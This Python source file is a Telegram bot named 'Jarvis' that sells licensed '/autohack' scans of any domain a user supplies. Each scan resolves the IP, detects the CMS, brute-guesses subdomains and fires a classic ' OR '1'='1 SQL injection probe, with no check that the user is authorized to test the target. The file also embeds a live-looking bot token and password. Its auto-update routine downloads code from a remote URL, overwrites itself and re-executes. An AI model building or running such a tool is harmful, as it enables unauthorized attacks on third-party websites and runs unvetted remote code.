# === IMPORTS ===
import os, sys, json, uuid, random, requests, openpyxl, socket, re
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# === CONFIG ===
BOT_TOKEN = '7555735752:AAH5hZx47POChM8lMFyQWfgWaGhM_T--Psc'
OWNER_ID = 7376549524  # ✅ Your Telegram ID
GENKEY_PASSWORD = "Password@8171886431@Password"
LICENSE_FILE = "license.json"
LOG_FILE = "daily_log.txt"
FREE_SCAN_FILE = "free_scan.json"
UPDATE_URL = "https://raw.githubusercontent.com/openai/assistant-jarvis-autoupdate/main/jarvis_ai_bot.py"

# === UTILS ===
def log(text):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} - {text}\n")

def device_id():
    return str(uuid.getnode())

def load_json(f): return json.load(open(f)) if os.path.exists(f) else {}

def save_json(f, d): open(f, "w").write(json.dumps(d))

def is_valid_license():
    data = load_json(LICENSE_FILE)
    dev = device_id()
    if dev in data:
        exp_str = data[dev].get("expiry")
        if not exp_str: return False
        try:
            exp = datetime.strptime(exp_str, "%Y-%m-%d")
            return exp > datetime.now()
        except:
            return False
    return False

def use_free_scan():
    scans = load_json(FREE_SCAN_FILE)
    dev = device_id()
    if dev not in scans:
        scans[dev] = True
        save_json(FREE_SCAN_FILE, scans)
        return True
    return False

def create_license_key():
    return f"Jarvis-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=4))}-{random.randint(1,9999):04d}"

def register_license(k, days=30):
    j = load_json(LICENSE_FILE)
    dev = device_id()
    if dev in j: return  # already registered
    expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
    j[dev] = {"key": k, "expiry": expiry}
    save_json(LICENSE_FILE, j)

def is_valid_domain(domain):
    return re.match(r"^(?!\-)([A-Za-z0-9\-]{1,63}(?<!\-)\.)+[A-Za-z]{2,6}$", domain) is not None

# === COMMANDS ===
async def start(u, c): await u.message.reply_text("🤖 Welcome to Jarvis!")
async def help_command(u, c):
    msg = (
        "🛠️ Commands:\n"
        "/start – welcome\n"
        "/autohack <domain> – full recon + SQLi\n"
        "/genkey <password> – (Owner only)\n"
        "/status – license status\n"
        "/help – show commands"
    )
    await u.message.reply_text(msg)

async def status(u, c):
    if is_valid_license():
        await u.message.reply_text("✅ License active and valid")
    else:
        await u.message.reply_text("🚫 No valid license")

async def genkey(u, c):
    if u.effective_user.id != OWNER_ID:
        return await u.message.reply_text("❌ Not authorized")
    if not (c.args and c.args[0] == GENKEY_PASSWORD):
        return await u.message.reply_text("🔐 Invalid password")
    k = create_license_key()
    register_license(k)
    await u.message.reply_text(f"✅ License: `{k}`", parse_mode='Markdown')
    log(f"KEY {k}")

async def autohack(u, c):
    if not (c.args and len(c.args) == 1):
        return await u.message.reply_text("Usage: /autohack <domain>")
    dom = c.args[0]
    if not is_valid_domain(dom):
        return await u.message.reply_text("❌ Invalid domain format.")
    if not is_valid_license():
        if not use_free_scan():
            return await u.message.reply_text("🚫 License required")
        await u.message.reply_text("🆓 Free scan activated")
    await u.message.reply_text(f"🔍 Scanning {dom}…")
    res = run_scan(dom)
    p = save_report(dom, res)
    await u.message.reply_document(open(p, "rb"))
    log(f"Scanned {dom}")

# === SCANNING LOGIC ===
def run_scan(domain):
    try:
        ip = socket.gethostbyname(domain)
    except:
        ip = "Unknown"
    return {
        "Target": domain,
        "IP": ip,
        "CMS": detect_cms(domain),
        "SQLi": test_sqli(f"http://{domain}/?id=1"),
        "Subdomains": find_subdomains(domain)
    }

def detect_cms(d):
    try:
        h = requests.get(f"http://{d}", timeout=5).text.lower()
        for w, name in [("wp-content", "WordPress"), ("joomla", "Joomla"), ("drupal", "Drupal")]:
            if w in h:
                return name
    except:
        pass
    return "Unknown"

def test_sqli(u):
    try:
        r = requests.get(u + "' OR '1'='1", timeout=5)
        if any(k in r.text.lower() for k in ("sql", "mysql", "syntax", "error")):
            return "Vulnerable"
    except:
        return "Error"
    return "Not Vulnerable"

def find_subdomains(domain):
    subs = ["www", "mail", "ftp", "admin", "test", "cpanel", "webmail", "blog", "dev"]
    found = []
    for s in subs:
        try:
            socket.gethostbyname(f"{s}.{domain}")
            found.append(f"{s}.{domain}")
        except:
            pass
    return ', '.join(found) if found else "None"

def save_report(dom, data):
    fname = f"{dom.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_report.xlsx"
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "Scan Report"
    ws.append(["Parameter", "Result"])
    for k, v in data.items():
        ws.append([k, str(v)])
    wb.save(fname)
    return fname

# === AUTO-UPDATE ===
def auto_update():
    print("🔄 auto_update() running")
    try:
        r = requests.get(UPDATE_URL, timeout=5)
        print("📌 status", r.status_code)
        if r.status_code == 200:
            new = r.text.strip()
            script_file = os.path.abspath(__file__)
            old = open(script_file).read().strip()
            if new != old:
                open(script_file, "w").write(new)
                log("🔄 Updated")
                os.execv(sys.executable, [sys.executable, script_file])
    except Exception as e:
        log("❌ updt failed: " + str(e))
        print("❌ updater failed – continuing")

# === MAIN ===
def main():
    print("✅ main start")
    auto_update()
    app = Application.builder().token(BOT_TOKEN).build()
    for cmd, fn in [
        ("start", start),
        ("help", help_command),
        ("autohack", autohack),
        ("genkey", genkey),
        ("status", status)
    ]:
        app.add_handler(CommandHandler(cmd, fn))
    app.add_handler(MessageHandler(filters.COMMAND, help_command))
    log("🚀 started")
    app.run_polling()

if __name__ == "__main__":
    main()
